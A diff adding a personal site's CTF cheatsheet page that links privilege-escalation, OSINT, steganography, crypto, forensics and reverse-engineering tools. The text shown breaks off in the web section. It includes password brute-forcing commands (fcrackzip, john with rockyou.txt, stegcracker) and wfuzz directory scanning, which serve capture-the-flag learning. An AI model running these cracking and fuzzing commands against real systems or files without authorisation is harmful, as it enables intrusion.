@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Haxxenigma.github.io home page">
+    <meta name="author" content="Haxxenigma">
+    <title>About</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <!-- Icon -->
+    <link rel="icon" type="image/svg+xml" href="./media/icon.svg">
+    <!-- Styles -->
+    <link rel="stylesheet" type="text/css" href="./css/style.css">
+    <!-- Scripts -->
+    <script src="./js/script.js" defer></script>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="nav">
+            <a href="/" class="logo">
+                <img src="./media/icon.svg">
+                WELCOME
+            </a>
+            <div class="navLinks">
+                <a href="/">Home</a>
+                <a href="./about.html">About</a>
+                <a href="./blog.html">Blog</a>
+                <a href="https://github.com/Haxxenigma/Haxxenigma.github.io" target='_blank' rel='noopener noreferrer'>GitHub</a>
+            </div>
+        </nav>
+    </header>
+    <main class="main">
+        <aside class="aside">
+            <nav class="articleNav">
+                <h1>CTF Cheatsheets</h1>
+                <a href="#section1" class="active">Linux Privilege Escalation</a>
+                <a href="#section2">OSINT</a>
+                <a href="#section3">Steganography</a>
+                <a href="#section4">Cryptography</a>
+                <a href="#section5">Digital Forensics</a>
+                <a href="#section6">Reverse Engineering</a>
+                <a href="#section7">Binary Exploit/Pwn</a>
+                <a href="#section8">WEB</a>
+                <a href="#section9">PCAP analysis</a>
+                <a href="#section10">Passwords</a>
+                <a href="#section11">Wordlists</a>
+                <a href="#section12">General</a>
+                <a href="#section13">Crontab</a>
+                <a href="#section14">Other cheatsheets</a>
+            </nav>
+        </aside>
+        <article class="article">
+            <section id="section1" class="active">
+                <h2 id="linux-privilege-escalation"><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md">Linux Privilege Escalation</a></h2>
+                <h3 id="primary">Primary</h3>
+                <ul>
+                    <li><a href="https://gtfobins.github.io/" title="https://gtfobins.github.io/">GTFOBins</a></li>
+                    <li><a href="https://www.linuxkernelcves.com/cves" title="https://www.linuxkernelcves.com/cves">Linux Kernerl CVEs</a></li>
+                    <li><a href="https://www.rapid7.com/" title="https://www.rapid7.com/">Rapid7</a></li>
+                    <li><a href="https://www.exploit-db.com/" title="https://www.exploit-db.com/">ExploitDB</a></li>
+                    <ul>
+                        <li><a href="https://www.kali.org/tools/exploitdb/" title="https://www.kali.org/tools/exploitdb/">Searchsploit - ExploitDB in CLI</a></li>
+                        <li><a href="https://www.exploit-db.com/exploits/1518" title="https://www.exploit-db.com/exploits/1518">MySQL - User-Defined Function (UDF)</a></li>
+                    </ul>
+                </ul>
+
+                <h3 id="linux-privilege-escalation-scripts">Linux Privilege Escalation Scripts</h3>
+                <ul>
+                    <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" title="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></li>
+                    <li><a href="https://github.com/rebootuser/LinEnum" title="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+                    <li><a href="https://github.com/diego-treitos/linux-smart-enumeration" title="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a></li>
+                    <li><a href="https://github.com/linted/linuxprivchecker" title="https://github.com/linted/linuxprivchecker">Linux Priv Checker</a></li>
+                    <li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester" title="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux Exploit Suggester</a></li>
+                    <li><a href="https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits" title="https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits">Linux Exploit Suggester 2 &amp; Dirty Cow</a></li>
+                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" title="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li>
+                    <ul>
+                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" title="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheatsheet</a></li>
+                    </ul>
+                </ul>
+
+                <h3 id="cheatsheets">Cheatsheets</h3>
+                <ul>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md">Linux Privilege Escalation Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Metasploit.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Metasploit.md">Metasploit Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap.md">Nmap Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap-Live-Host-Discovery.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Nmap-Live-Host-Discovery.md">Nmap Live Host Discovery Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/SQL-Injection.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/SQL-Injection.md">SQL Injection Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/OWASP-Top-10.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/OWASP-Top-10.md">OWASP Top-10 Cheatsheet</a></li>
+                    <li><a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Google-Dorking.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Google-Dorking.md">Google Dorking Cheatsheet</a></li>
+                </ul>
+            </section>
+
+            <section id="section2">
+                <h2 id="osint">OSINT</h2>
+                <ul>
+                    <li><a href="https://github.com/jivoi/awesome-osint" title="https://github.com/jivoi/awesome-osint">awesome-osint</a></li>
+                    <li><a href="https://github.com/saeeddhqan/Maryam" title="https://github.com/saeeddhqan/Maryam">Maryam</a></li>
+                    <li><a href="https://github.com/Bafomet666/OSINT-SAN" title="https://github.com/Bafomet666/OSINT-SAN">OSINT-SAN</a></li>
+                </ul>
+            </section>
+
+            <section id="section3">
+                <h2 id="steganography">Steganography</h2>
+                <ul>
+                    <li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures" title="https://en.wikipedia.org/wiki/List_of_file_signatures">List of <code>file</code> signatures</a></li>
+                    <code class="lang-shell"><span class="hljs-keyword">file</span> &lt;<span class="hljs-keyword">filename</span>&gt;</code>
+                    <li><a href="https://linuxopsys.com/topics/strings-command-in-linux#:~:text=The%20strings%20command%20is%20used,error%20messages%2C%20and%20embedded%20strings" title="https://linuxopsys.com/topics/strings-command-in-linux#:~:text=The%20strings%20command%20is%20used,error%20messages%2C%20and%20embedded%20strings">extracts <code>strings</code> in the given binary</a></li>
+                    <code class="lang-shell">strings [<span class="hljs-keyword">options</span> (-<span class="hljs-keyword">a</span> | --<span class="hljs-keyword">all</span>)] <span class="hljs-symbol">&lt;filename&gt;</span></code>
+                    <li><a href="https://www.kali.org/tools/libimage-exiftool-perl/" title="https://www.kali.org/tools/libimage-exiftool-perl/">exiftool</a></li>
+                    <code class="lang-shell">exiftool <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span></code>
+                    <li><a href="https://www.kali.org/tools/binwalk/" title="https://www.kali.org/tools/binwalk/">binwalk</a></li>
+                    <code class="lang-shell"><span class="hljs-keyword">binwalk </span>&lt;filename&gt;</code>
+                    <li><a href="https://www.kali.org/tools/foremost/" title="https://www.kali.org/tools/foremost/">foremost</a></li>
+                    <code class="lang-shell">foremost -v <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span></code>
+                </ul>
+
+                <h3 id="images">Images</h3>
+                <ul>
+                    <li><a href="https://tineye.com/" title="https://tineye.com/">tineye — Reverse search</a></li>
+                    <li><a href="https://imagemagick.org/" title="https://imagemagick.org/">imagemagick — do image manipulation</a></li>
+                    <li><a href="https://yandex.kz/search/?text=Stegsolve.jar" title="https://yandex.kz/search/?text=Stegsolve.jar">Stegsolve.jar — unhide flag from an image</a></li>
+                    <li><a href="https://github.com/Y-Vladimir/SmartDeblur" title="https://github.com/Y-Vladimir/SmartDeblur">SmartDeblur — fix blurry on image</a></li>
+                    <li><a href="https://tesseract-ocr.github.io/" title="https://tesseract-ocr.github.io/">tesseract — scan text in image and convert it to .txt file</a></li>
+
+                    <br>
+
+                    <li><a href="https://www.kali.org/tools/steghide/" title="https://www.kali.org/tools/steghide/">steghide — File carve</a></li>
+                    <code class="lang-shell">steghide --extract -<span class="hljs-keyword">sf</span> <span class="hljs-symbol">&lt;filename&gt;</span>
+                    </code>
+                    <li><a href="https://manpages.ubuntu.com/manpages/focal/man1/pngcheck.1.html" title="https://manpages.ubuntu.com/manpages/focal/man1/pngcheck.1.html">pngcheck — Check for any corruption on PNG</a></li>
+                    <code class="lang-shell">pngcheck <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                    <li><a href="https://github.com/zed-0xff/zsteg" title="https://github.com/zed-0xff/zsteg">zsteg — Detect stegano-hidden data in PNG &amp; BMP</a></li>
+                    <code class="lang-shell">zsteg -<span class="hljs-selector-tag">a</span> &lt;filename&gt;
+                    </code>
+                    <li><a href="https://www.kali.org/tools/stegcracker/" title="https://www.kali.org/tools/stegcracker/">stegcracker — brute-force password utility to uncover hidden data inside files</a></li>
+                    <code class="lang-shell">stegcracker <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span>
+                    </code>
+                </ul>
+
+                <br>
+
+                <ul>
+                    <li><a href="https://futureboy.us/stegano/encinput.html" title="https://futureboy.us/stegano/encinput.html">futureboy — Steganographic Encoder/</a><a href="https://futureboy.us/stegano/decinput.html" title="https://futureboy.us/stegano/decinput.html">Decoder</a></li>
+                    <li><a href="http://stylesuxx.github.io/steganography/" title="http://stylesuxx.github.io/steganography/">stylesuxx — Steganographic Encoder/Decoder</a></li>
+                    <li><a href="https://www.mobilefish.com/services/steganography/steganography.php" title="https://www.mobilefish.com/services/steganography/steganography.php">mobilefish — Steganographic Encrypter/Decrypter</a></li>
+                    <li><a href="https://manytools.org/hacker-tools/steganography-encode-text-into-image/" title="https://manytools.org/hacker-tools/steganography-encode-text-into-image/">manytools — Encoder text into image</a></li>
+                    <li><a href="https://stegonline.georgeom.net/upload" title="https://stegonline.georgeom.net/upload">StegOnline</a></li>
+                    <li><a href="http://magiceye.ecksdee.co.uk/" title="http://magiceye.ecksdee.co.uk/">Magic Eye Solver/Viewer</a></li>
+                </ul>
+
+                <br>
+
+                <h3 id="compressed-file">Compressed file</h3>
+                <ul>
+                    <li><a href="https://manpages.ubuntu.com/manpages/trusty/man1/zipdetails.1.html" title="https://manpages.ubuntu.com/manpages/trusty/man1/zipdetails.1.html">zipdetails — display details about the internal structure of a Zip file</a></li>
+                    <code class="lang-shell">zipdetails -v <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                    <li><a href="https://manpages.ubuntu.com/manpages/lunar/man1/zipinfo.1.html" title="https://manpages.ubuntu.com/manpages/lunar/man1/zipinfo.1.html">zipinfo — show details info about Zip file</a></li>
+                    <code class="lang-shell">zipinfo <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                    <li><a href="https://manpages.ubuntu.com/manpages/focal/man1/zip.1.html" title="https://manpages.ubuntu.com/manpages/focal/man1/zip.1.html">zip — attempt to repair a corrupted Zip file</a></li>
+                    <code class="lang-shell">zip -FF <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span> --out <span class="hljs-tag">&lt;<span class="hljs-name">outputfile</span>&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/fcrackzip/" title="https://www.kali.org/tools/fcrackzip/">fcrackzip — Brute-force the zip password</a></li>
+                    <code class="lang-shell">fcrackzip -D -u -p <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                    <li>To crack 7z:</li>
+                    <ol>
+                        <li>
+                            <code>7<span class="hljs-selector-tag">z2hashcat32-1</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">filename</span><span class="hljs-selector-class">.7z</span>
+                            </code>
+                        </li>
+                        <li>
+                            <code>john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash
+                            </code>
+                        </li>
+                    </ol>
+                </ul>
+
+                <br>
+
+                <h3 id="mucis-file">Mucis file</h3>
+                <ul>
+                    <li><a href="https://ru.wikipedia.org/wiki/Audacity" title="https://ru.wikipedia.org/wiki/Audacity">Audacity</a></li>
+                    <li><a href="https://en.wikipedia.org/wiki/Sonic_Visualiser" title="https://en.wikipedia.org/wiki/Sonic_Visualiser">Sonic Visualizer — Look at spectogram and other few Pane</a></li>
+                    <li><a href="https://medium.com/@ibnshehu/deepsound-audio-steganography-tool-f7ca0a897576" title="https://medium.com/@ibnshehu/deepsound-audio-steganography-tool-f7ca0a897576">Deepsound</a></li>
+                    <li><a href="https://yandex.kz/search/?text=SilentEye" title="https://yandex.kz/search/?text=SilentEye">SilentEye</a></li>
+                    <li><a href="https://www.stegonaut.com/" title="https://www.stegonaut.com/">Stegonaut</a></li>
+                </ul>
+
+                <br>
+
+                <h3 id="pdf">pdf</h3>
+                <ul>
+                    <li><a href="https://poppler.freedesktop.org/" title="https://poppler.freedesktop.org/">pdfinfo</a></li>
+                    <code class="lang-shell">sudo apt <span class="hljs-keyword">install</span> poppler-utils
+                    </code>
+                    <code class="lang-shell">pdfinfo <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                    <li><a href="https://github.com/qpdf/qpdf" title="https://github.com/qpdf/qpdf">qpdf</a></li>
+                    <li><a href="https://github.com/zha0/pdfstreamdumper" title="https://github.com/zha0/pdfstreamdumper">PDFStreamdumper</a></li>
+                    <li><a href="https://www.kali.org/tools/pdfcrack/" title="https://www.kali.org/tools/pdfcrack/">pdfcrack</a></li>
+                    <li><a href="https://manpages.ubuntu.com/manpages/xenial/man1/pdfimages.1.html" title="https://manpages.ubuntu.com/manpages/xenial/man1/pdfimages.1.html">pdfimages</a></li>
+                    <li><a href="https://manpages.ubuntu.com/manpages/kinetic/man1/pdfdetach.1.html" title="https://manpages.ubuntu.com/manpages/kinetic/man1/pdfdetach.1.html">pdfdetach</a></li>
+                    <li><a href="https://www.kali.org/tools/pdf-parser/" title="https://www.kali.org/tools/pdf-parser/">pdf-parser</a></li>
+                    <li><a href="https://github.com/jesparza/peepdf" title="https://github.com/jesparza/peepdf">peepdf</a></li>
+                    <li><a href="https://www.kali.org/tools/pdfid/" title="https://www.kali.org/tools/pdfid/">pdfid</a></li>
+                    <li><a href="https://pdftotext.com/" title="https://pdftotext.com/">pdftotext</a></li>
+                    <li><br></li>
+                    <h3 id="text">Text</h3>
+                    <li><a href="https://www.spammimic.com/" title="https://www.spammimic.com/">spammimic — can decode hide message in spam text</a></li>
+                </ul>
+            </section>
+
+            <section id="section4">
+                <h2 id="cryptography">Cryptography</h2>
+                <ul>
+                    <li><a href="https://www.urlencoder.org/" title="https://www.urlencoder.org/">URL Encode/</a><a href="https://www.urldecoder.org/" title="https://www.urldecoder.org/">Decode</a></li>
+                    <li><a href="https://www.base64encode.org/" title="https://www.base64encode.org/">Base64 Encode/</a><a href="https://www.base64decode.org/" title="https://www.base64decode.org/">Decode</a></li>
+                    <li><a href="https://emn178.github.io/online-tools/base32_encode.html" title="https://emn178.github.io/online-tools/base32_encode.html">Base32 Encode/</a><a href="https://emn178.github.io/online-tools/base32_decode.html" title="https://emn178.github.io/online-tools/base32_decode.html">Decode</a></li>
+                    <li><a href="https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html" title="https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html">ASCII, Hex, Binary, Decimal, Base64 converter</a></li>
+                    <li><a href="https://www.rapidtables.com/convert/number/ascii-to-hex.html" title="https://www.rapidtables.com/convert/number/ascii-to-hex.html">ASCII Text to Hex Code Converter</a></li>
+                    <li><a href="https://cryptii.com/" title="https://cryptii.com/">cryptii — All in one #1</a></li>
+                    <li><a href="https://www.dcode.fr/" title="https://www.dcode.fr/">dcode — All in one #2</a></li>
+                    <li><a href="https://rumkin.com/tools/cipher/" title="https://rumkin.com/tools/cipher/">rumkin — All in one #3</a></li>
+                    <li><a href="https://quipqiup.com/" title="https://quipqiup.com/">quipqiup</a></li>
+                    <li><a href="https://www.guballa.de/substitution-solver" title="https://www.guballa.de/substitution-solver">Substitution Solver</a></li>
+                    <li><a href="https://www.guballa.de/vigenere-solver" title="https://www.guballa.de/vigenere-solver">Vigenère Solver</a></li>
+                    <li><a href="http://www.unit-conversion.info/texttools/morse-code/" title="http://www.unit-conversion.info/texttools/morse-code/">Morse code Decoder</a></li>
+                    <li><a href="https://rot13.com/" title="https://rot13.com/">Rot 1 - 25 Decryptor</a></li>
+                    <li><a href="https://cryptii.com/pipes/ascii85-encoding" title="https://cryptii.com/pipes/ascii85-encoding">ASCII85 Decoder</a></li>
+                    <li><a href="https://github.com/Ciphey/Ciphey" title="https://github.com/Ciphey/Ciphey">Ciphey</a></li>
+                    <li>Base64 Decode in CLI:</li>
+                    <code class="lang-shell"><span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;base64 string&gt;'</span> | base64 <span class="hljs-_">-d</span>
+                    </code>
+                </ul>
+
+                <br>
+
+                <ul>
+                    <li><a href="https://gchq.github.io/CyberChef/" title="https://gchq.github.io/CyberChef/">CyberChef — All in one</a></li>
+                    <li><a href="https://crackstation.net/" title="https://crackstation.net/">Crackstation — Crack Hash</a></li>
+                    <li><a href="https://www.cryptool.org/en/" title="https://www.cryptool.org/en/">Cryptool</a></li>
+                    <li><a href="https://www.kali.org/tools/john/" title="https://www.kali.org/tools/john/">John the Ripper</a></li>
+                    <li><a href="https://www.kali.org/tools/hashcat/" title="https://www.kali.org/tools/hashcat/">Hashcat</a></li>
+                </ul>
+
+                <br>
+
+                <h3 id="openssl">OpenSSL</h3>
+                <ul>
+                    <li>Decrypt a file using RSA private key</li>
+                    <code class="lang-shell">openssl rsautl -decrypt -inkey pub_priv<span class="hljs-selector-class">.key</span> -<span class="hljs-keyword">in</span> ciphertext<span class="hljs-selector-class">.file</span> -out decrypted.file
+                    </code>
+                    <li>Decrypt a file using AES-256-CBC and a keyfile</li>
+                    <code class="lang-shell">openssl enc -d -aes-<span class="hljs-number">256</span>-cbc -<span class="hljs-keyword">in</span> ciphertext.<span class="hljs-keyword">file</span> -<span class="hljs-keyword">out</span> cleartext.<span class="hljs-keyword">file</span> -<span class="hljs-keyword">pass</span> <span class="hljs-keyword">file</span>:./key.<span class="hljs-keyword">file</span>
+                    </code>
+                    <li>Decrypt a file using AES-256-CBC</li>
+                    <code class="lang-shell">openssl <span class="hljs-keyword">enc</span> -aes-256-cbc -<span class="hljs-keyword">d</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span>.txt.<span class="hljs-keyword">enc</span> -<span class="hljs-keyword">out</span> <span class="hljs-keyword">file</span>.txt
+                    </code>
+                    <li>Decrypt a file using AES-256-CBC with base64 encoded</li>
+                    <code class="lang-shell">openssl <span class="hljs-keyword">enc</span> -aes-256-cbc -<span class="hljs-keyword">d</span> -a -<span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span>.txt.<span class="hljs-keyword">enc</span> -<span class="hljs-keyword">out</span> <span class="hljs-keyword">file</span>.txt
+                    </code>
+                    <li>Others reference
+                        <a href="https://gist.github.com/dreikanter/c7e85598664901afae03fedff308736b#file-encrypt_openssl-md">https://gist.github.com/dreikanter/c7e85598664901afae03fedff308736b#file-encrypt_openssl-md</a>
+                    </li>
+                </ul>
+
+                <br>
+
+                <h3 id="cracking-compressed-file">Cracking compressed file</h3>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/john/" title="https://www.kali.org/tools/john/">John the Ripper</a></li>
+                    <code class="lang-shell">john --wordlist=<span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">hashfile</span>&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/fcrackzip/" title="https://www.kali.org/tools/fcrackzip/">fcrackzip</a></li>
+                    <code class="lang-shell">fcrackzip -D -u -p <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filename.zip</span>&gt;</span>
+                    </code>
+                </ul>
+            </section>
+
+            <section id="section5">
+                <h2 id="digital-forensics">Digital Forensics</h2>
+                <blockquote>memory dump like <code>.raw</code> or image file like <code>.e01</code></blockquote>
+                <ul>
+                    <li><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" title="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">Volatility — memory extraction utility framework for memory forensic</a></li>
+                    <li><a href="https://fareedfauzi.gitbook.io/windows-forensics-playbook/memory-forensics-analysis/redline-automate-memory-collector-and-analyzer" title="https://fareedfauzi.gitbook.io/windows-forensics-playbook/memory-forensics-analysis/redline-automate-memory-collector-and-analyzer">Redline — alternative to volatility</a></li>
+                    <li><a href="https://www.kali.org/tools/bulk-extractor/" title="https://www.kali.org/tools/bulk-extractor/">Bulk-extractor — can extracts features such as email addresses, credit card numbers, URLs, and other types of information from digital evidence files</a></li>
+                    <li><a href="https://yandex.kz/search/?text=FTK+Imager" title="https://yandex.kz/search/?text=FTK+Imager">FTK Imager — data preview and imaging tool that allows you to examine files and folders on local hard drives, network drives, CDs/DVDs, and review the content of forensic images or memory dumps</a></li>
+                    <li><a href="https://www.autopsy.com/" title="https://www.autopsy.com/">Autopsy</a>, <a href="https://prodiscover.com/" title="https://prodiscover.com/">ProDiscover</a>, <a href="https://www.opentext.com/products/encase-forensic" title="https://www.opentext.com/products/encase-forensic">EnCase</a> — as FTK Imager</li>
+                    <li><a href="https://manpages.ubuntu.com/manpages/impish/man8/e2fsck.8.html" title="https://manpages.ubuntu.com/manpages/impish/man8/e2fsck.8.html">e2fsck — fix corrupt filesystem (ext2-4)</a></li>
+                    <li><a href="https://www.ccleaner.com/ru-ru/recuva" title="https://www.ccleaner.com/ru-ru/recuva">Recuva — recover files</a></li>
+                    <li><a href="https://www.kali.org/tools/regripper/" title="https://www.kali.org/tools/regripper/">RegRipper — for registry analysis</a></li>
+                    <li>Tools for scanning event log:</li>
+                    <ul>
+                        <li>DeepblueCLI</li>
+                        <li>Chainsaw</li>
+                        <li>WELA</li>
+                        <li>HayaBusa</li>
+                        <li>APTHunter</li>
+                    </ul>
+                </ul>
+            </section>
+            <section id="section6">
+                <h2 id="reverse-engineering">Reverse Engineering</h2>
+                <h3 id="pe-file-exe-or-dll-">PE File (.exe or .dll)</h3>
+                <ul>
+                    <li>Use <strong>DIE</strong>, <strong>PEID</strong>, <strong>PEBear</strong>, or <strong>PEView</strong> software to do static file analysis. Find details of file in there!</li>
+                    <li>Use <strong>HxD</strong> to check the header file, file signature. Maybe the corrupt file sign one.</li>
+                    <li>Find it whether it packed or not. Find online unpack.</li>
+                    <li>Find it whether the binary has anti-debug or not.</li>
+                    <li>Use <strong>IDA Pro</strong> software to perform static analysis on the binary.</li>
+                    <li>When do analysis static or dynamic focus on <code>strcmp</code>, function <code>call</code>, <code>conditional jump</code>.</li>
+                    <li>You can use <strong>Snowman</strong> or <strong>Ghidra</strong> software to perform decompiler.</li>
+                    <li>Use debugger like <strong>Immunity Debugger</strong>, <strong>x64Dbg/x32Dbg</strong>, or <strong>WinDbg</strong> to debug the binary. </li>
+                    <li>API monitor</li>
+                    <li>Frida-trace</li>
+                </ul>
+                <h3 id="elf-file-elf-">ELF File (.elf)</h3>
+                <ul>
+                    <li>Use <code>ltrace &lt;filename&gt;</code> command to know what library function are being called in the binary.</li>
+                    <li>Use <code>strace &lt;filename&gt;</code> command to know what system and signal function are being called in the binary.</li>
+                    <li>Use <code>nm &lt;filename&gt;</code> command to know what symbol being called in the binary.</li>
+                    <li>Use <code>readelf -a &lt;filename&gt;</code> command. It will displays information about ELF files.</li>
+                    <li>Use Gdb debugger extension. <code>Peda</code>, <code>pwndbg</code> or <code>gef</code> will help you!.</li>
+                    <li>Or you can use edb debugger.</li>
+                    <li>Use <strong>IDA Pro</strong> software to perform static analysis on the binary.</li>
+                </ul>
+                <h3 id="apk-file-apk-">APK File (.apk)</h3>
+                <ul>
+                    <li>Use <code>APKTool &lt;filename&gt;</code> command tools.</li>
+                    <li>Use Android Emulator to run the program.</li>
+                    <li>Use Android Debug Bridge.</li>
+                    <li>Use <code>dex2jar &lt;filename&gt;</code> command tools.</li>
+                    <li>Use <strong>jd-gui</strong>. </li>
+                    <li><strong>JADX</strong> is good alternative to jd-gui.</li>
+                    <li>Rename the file to zip file. Unzip it. Take a look the file in your favorite text editor.</li>
+                </ul>
+                <h3 id="-net-file-exe-">.NET File (.exe)</h3>
+                <ul>
+                    <li>Use <strong>dnSpy</strong> software. Very powerful. You can compile the program by</li>
+                    <ul>
+                        <li>Edit in the main interface -&gt; compile -&gt; save all. Try run the program back!</li>
+                    </ul>
+                </ul>
+                <h3 id="java-file">Java file</h3>
+                <ul>
+                    <li>Use <strong>JADX</strong></li>
+                </ul>
+                <h3 id="python-file">Python file</h3>
+                <ul>
+                    <li>There are many options, one of it is <strong>uncompyle6</strong>. Just google dor python decompiler.</li>
+                    <li><a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a> - Python EXE to pyc</li>
+                </ul>
+                <h3 id="shellcode">Shellcode</h3>
+                <ul>
+                    <li>scdbg</li>
+                    <li>shellcode2exe</li>
+                    <li>pdfstreamdumper shellcode analysis</li>
+                    <li>debugger</li>
+                    <li>IDA Pro</li>
+                    <li>unicode2hex-escaped</li>
+                    <li>hxd</li>
+                </ul>
+                <h3 id="others">Others</h3>
+                <ul>
+                    <li><a href="https://www.decompiler.com/">https://www.decompiler.com/</a></li>
+                    <ul>
+                        <li>EXE or DLL (C#), JAR or CLASS, APK, XAPK or DEX, PYC or PYO, LUAC or LUB, SMX or AMXX</li>
+                    </ul>
+                </ul>
+                <blockquote>
+                    <li>Renaming functions and variables, deobfuscation and doing a good work is not something that matters during a CTF; we only need the flag. Thus, why reverse engineer when you don’t have too? The less we reverse, the better it is.</li>
+                </blockquote>
+            </section>
+            <section id="section7">
+                <h2 id="binary-exploit-pwn">Binary Exploit / Pwn</h2>
+                <li><code>checksec</code> — check the properties of executable of binary security</li>
+                <ul>
+                    <li><strong>Stack Canaries</strong> = a secret value placed on the stack which changes every time the program is started. the stack canary is checked and if it appears to be modified, the program exits immeadiately.</li>
+                    <li><strong>Nx</strong> = stored input or data cannot be executed as code</li>
+                    <li><strong>Address Space Layout Randomization (ASLR)</strong> = The randomization of the place in memory where the program, shared libraries, the stack, and the heap are.</li>
+                    <li><strong>RELRO</strong> = makes binary sections read-only.</li>
+                </ul>
+                <li><strong>Tools</strong></li>
+                <ul>
+                    <li>Pwntool framework</li>
+                    <li>Gdb debugger. Peda, pwndbg or gef.</li>
+                    <li>Use <code>readelf -a &lt;filename&gt;</code> command. It will displays information about ELF files.</li>
+                    <li>Use <code>nm &lt;filename&gt;</code> command to know what symbol being called in the binary.</li>
+                    <li>Python</li>
+                </ul>
+                <li><strong>Function that can lead to bof</strong></li>
+                <ul>
+                    <li>scanf</li>
+                    <li>read</li>
+                    <li>strcat</li>
+                    <li>fread</li>
+                    <li>fgets</li>
+                    <li>sprintf</li>
+                    <li>strcpy</li>
+                    <li>gets</li>
+                    <li>memcpy</li>
+                    <li>memmove</li>
+                    <li>strncpy</li>
+                    <li>snprintf</li>
+                    <li>strncat</li>
+                </ul>
+            </section>
+
+            <section id="section8">
+                <h2 id="web">WEB</h2>
+                <h3 id="use-curl">Use curl</h3>
+                <code class="lang-shell"><span class="hljs-symbol">curl</span> &lt;<span class="hljs-built_in">ip</span> <span class="hljs-keyword">address/dns&gt;</span>
+                </code>
+                <h3 id="scan-for-directories">Scan for directories</h3>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/wfuzz/" title="https://www.kali.org/tools/wfuzz/">wfuzz</a></li>
+                    <code>wfuzz -c -z file,<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/wfuzz/</span>wordlist<span class="hljs-meta-keyword">/general/</span>common.txt --hc <span class="hljs-number">404</span> <span class="hljs-params">&lt;url&gt;</span>/FUZZ
+                    </code>
+                    <li><a href="https://www.kali.org/tools/ffuf/" title="https://www.kali.org/tools/ffuf/">ffuf</a></li>
